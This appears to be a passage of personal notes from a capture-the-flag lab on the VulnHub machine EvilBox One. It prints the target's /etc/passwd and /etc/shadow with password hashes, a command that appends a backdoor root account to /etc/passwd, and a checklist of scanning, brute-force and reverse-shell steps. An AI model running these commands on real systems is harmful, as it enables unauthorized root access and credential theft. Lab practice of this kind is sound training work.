daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin        
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync                                                                                                                               games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin                                                  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin                                                                                                                      news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin                                                                                                              proxy:x:13:13:proxy:/bin:/usr/sbin/nologin                                                  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mowree@EvilBoxOne:/tmp$ 
```

## OpenSSL

```bash
# root:x:0:0:root:/root:/bin/bash
# echo "daacals:$(openssl passwd -6 -salt daacals password1337):0:0:daacals:/root:/bin/bash" >> /etc/passwd

# Now login as the newly created root user
```

![](evilbox_rootflag.png)

---
---


# BONUS

```bash
root@EvilBoxOne:~# cat /etc/shadow
root:$6$ekUmqx0sLn4DGvRl$JfWqXeRjvHKXJX2HIfKo1z5WVeDq3JK7Y9yZw17PIapqvy15lo4DB1JT5Faz64riHJq2yQfX6YTLGEAnm/y0e1:18855:0:99999:7:::                  
daemon:*:18855:0:99999:7:::                                                                                                                         
bin:*:18855:0:99999:7:::
sys:*:18855:0:99999:7:::
sync:*:18855:0:99999:7:::        
games:*:18855:0:99999:7:::
man:*:18855:0:99999:7:::
lp:*:18855:0:99999:7:::
mail:*:18855:0:99999:7:::
news:*:18855:0:99999:7:::
uucp:*:18855:0:99999:7:::                                                                                                                                        proxy:*:18855:0:99999:7:::
www-data:*:18855:0:99999:7:::       
backup:*:18855:0:99999:7:::
list:*:18855:0:99999:7:::
irc:*:18855:0:99999:7:::
gnats:*:18855:0:99999:7:::
nobody:*:18855:0:99999:7:::
_apt:*:18855:0:99999:7:::
systemd-timesync:*:18855:0:99999:7:::
systemd-network:*:18855:0:99999:7:::
systemd-resolve:*:18855:0:99999:7:::
messagebus:*:18855:0:99999:7:::
sshd:*:18855:0:99999:7:::
mowree:$6$MVihxQgatuO4Ytgu$oZXc7xa0zk8yPmSaUcqId2GorhcSk5yrVDYOVZL87XfYDd8i8lwmVuwkd7CPyOmuXQCmrPIC/MBzGJhOboRWm/:18855:0:99999:7:::
systemd-coredump:!!:18855::::::
root@EvilBoxOne:~# 

root@EvilBoxOne:~# awk -F: '/^root/{print $2}' /etc/shadow
$6$ekUmqx0sLn4DGvRl$JfWqXeRjvHKXJX2HIfKo1z5WVeDq3JK7Y9yZw17PIapqvy15lo4DB1JT5Faz64riHJq2yQfX6YTLGEAnm/y0e1
```


---
---

# VulnHub Pentest Notes - [EvilBox 1]  
🔍 **Target IP:** `192.168.56.37`  
🖥 **OS:** Linux  
📅 **Date:** 2025-11-20  

---
## Resources & References  
📌 [VulnHub Link](https://www.vulnhub.com/entry/evilbox-one,736/)  
📌 [YouTube Walkthrough (if available)](https://www.youtube.com/watch?v=jehjt_iCMsk)  

---
# 🕵️ Enumeration  

### 🛜 Network Discovery  
- [ ] `sudo netdiscover -i eth1`
- [ ] `netdiscover -r <target-range>`  
- [ ] `arp-scan -l`  

### 🌐 Port Scanning  
- [ ] `nmap -sC -sV <IP>` (Basic Scan)
- [ ] `nmap -sC -sV <IP> -p-` (For all ports)
- [ ] `nmap -sC -sV -p- -oN nmap_scan.txt <IP>`
- [ ] `rustscan -a <IP> -- -A -oN rustscan.txt`  

### 🕸️ Web Enumeration  
- [ ] `gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt` (Check for any directories)
- [ ] `gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt`  (Directories with file extensions)
- [ ] `nikto -h http://<IP>/`  
- [ ] `hydra -l <Login Name> -P /usr/share/wordlists/rockyou.txt ftp://<IP>`

### 🔐 Credentials & SMB/NFS  
- [ ] `enum4linux -a <IP>`  
- [ ] `smbclient -L //<IP> -N`  
- [ ] `showmount -e <IP>`  

---
# 🦶 Initial Foothold  
- [ ] Identify possible exploits  
	- [ ] whatweb or Wappalyzer
- [ ] Try default credentials 🤡  
- [ ] Try Linpeas.sh 🫛
- [ ] Use Metasploit/Manual Exploitation  
- [ ] Upload and use a reverse shell  

